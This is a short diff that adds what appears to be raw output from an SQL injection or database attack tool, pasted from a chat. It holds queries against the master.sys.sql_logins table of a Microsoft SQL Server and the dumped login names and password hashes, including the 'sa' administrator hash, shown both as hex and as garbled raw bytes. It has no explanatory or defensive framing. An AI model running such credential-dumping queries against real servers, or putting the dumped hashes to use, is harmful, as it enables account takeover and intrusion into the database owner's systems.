@@ -1,0 +1,17 @@
+  to  Everyone
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins [3]:                                                                                                                                              
+
+[*] ##MS_PolicyEventProcessingLogin##-0x010089d2146a6b3832cb41b9ca78d70d8b5c93cc4865c474a376
+
+[*] ##MS_PolicyTsqlExecutionLogin##-0x0100161a734d666b6f6dcdabfa30baf333cc3cca27f62366e59d
+
+[*] sa-0x01000cf930ffcfa9797f6d82dea0fd129bc96ee08eea2f62310e
+SELECT name, password_hash FROM master.sys.sql_logins [3]:                                                                                                                                                                                   
+
+[*] ##MS_PolicyEventProcessingLogin##, \x01.‰\xd2\x14jk82\xcbA\xb9\xcax\xd7‹\\“\xccHe\xc4t\xa3v, \x01.‰\xd2\x14jk82\xcbA\xb9\xcax\xd7\r‹\\“\xccHe\xc4t\xa3v
+
+[*] ##MS_PolicyTsqlExecutionLogin##, \x01.\x16\x1asMfkomͫ\xfa0\xba\xf33\xcc<\xca'\xf6#f\xe5\x9d
+
+[*] sa, \x01.\x0c\xf90\xffϩy\x7fm‚ޠ\xfd\x12›\xc9n\xe0Ž\xea/b1\x0e
+sa
+[*] sa-0x01000cf930ffcfa9797f6d82dea0fd129bc96ee08eea2f62310e
